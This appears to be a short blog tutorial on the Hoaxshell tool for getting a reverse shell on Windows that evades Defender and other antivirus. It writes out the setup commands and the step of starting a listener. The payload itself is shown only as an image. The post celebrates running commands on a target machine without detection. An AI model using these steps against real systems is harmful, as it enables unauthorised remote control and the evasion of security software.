---
title: Fully Undetectable Reverse Shells
date: '2022-10-12'
tags: ['cybersecurity']
draft: false
summary: Create a reverse shell which is fully undetectable by Win Defender and other anti virus
images: []
layout: PostLayout
authors: ['default']
---

# Frustrated with AVs breaking your shells?

Not to worry anymore I got your back. I will show you how to create a reverse shell which is fully undetectable by Win Defender and other anti virus.

# Introducing [Hoaxshell](https://github.com/t3l3machus/hoaxshell) 🚗
![Hoaxshell](/static/images/blogs/fully-undetectable-reverse-shells/hoaxshell-logo.png)

Hoaxshell is a reverse shell which as of writing this post is **completely undetectable** by Defender and other Anti Viruses.

# Setup 📐
```bash
git clone https://github.com/t3l3machus/hoaxshell
cd hoaxshell
pip3 install -r requirements.txt
```

# Usage 👊🏻
```bash
python3 hoaxshell.py -h
```
![Usage](/static/images/blogs/fully-undetectable-reverse-shells/usage.png)

You need to start by providing an IP to listen on

1. ### Find your IP address
```bash
sudo ifconfig
```

![IP](/static/images/blogs/fully-undetectable-reverse-shells/find-ip.png)

2. ### Start the listener
```bash
python hoaxshell.py -s <Your IP here>
```
![Listener](/static/images/blogs/fully-undetectable-reverse-shells/hoaxshell-start.png)

3. ### Run the giant monstrous payload on the target machine

![Exploit](/static/images/blogs/fully-undetectable-reverse-shells/exploit.png)

<br />

# You now have a shell 🔥🎊

And the best part? You can now run any command without being detected.

![Shell](/static/images/blogs/fully-undetectable-reverse-shells/shell.png)

## Running commands

![Commands](/static/images/blogs/fully-undetectable-reverse-shells/running-commands.png)

## Anti Virus Fool Proof

![AV](/static/images/blogs/fully-undetectable-reverse-shells/anti-virus.png)

Both **Defender** and **Quick Heal** are fooled by the payload and do not detect it.
